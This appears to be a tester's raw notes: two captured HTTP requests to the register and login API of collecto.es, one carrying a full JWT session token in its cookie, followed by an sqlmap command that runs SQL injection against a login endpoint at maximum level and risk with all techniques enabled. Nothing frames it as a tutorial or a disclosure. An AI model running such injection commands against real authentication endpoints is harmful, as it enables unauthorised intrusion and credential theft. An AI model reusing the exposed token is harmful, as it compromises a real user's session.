POST /api/auth/register HTTP/2
Host: collecto.es
Content-Length: 150
Sec-Ch-Ua: "Not/A)Brand";v="8", "Chromium";v="126"
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: https://collecto.es
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://collecto.es/
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

{"email":"hola@hola.com","username":"usuario","firstName":"nombre","lastName":"apellido","password":"12345","confirmPassword":"12345","consent":false}

--------------

POST /api/auth/login HTTP/2
Host: collecto.es
Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY4Mzk0NzRjZThhOGVlYmUwZThkMGJlMyIsInVzZXJuYW1lIjoidXN1YXJpbyIsImlhdCI6MTc0ODU4NDI2OCwiZXhwIjoxNzQ4NTg3ODY4fQ.jhqIkb85jDyKZxrlhWZ6gCW48PnHuy5GvrhasEcWzpo
Content-Length: 60
Sec-Ch-Ua: "Not/A)Brand";v="8", "Chromium";v="126"
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: https://collecto.es
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://collecto.es/universe/harry-potter
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

{"username":"miuser2","password":"12345","rememberMe":false}

-----


sqlmap -u "http://target.com/api/auth/login" --data '{"username":"admin","password":"123456"}' --headers="Content-Type: application/json"  --level=5 --risk=3 --technique=BEUST

----------
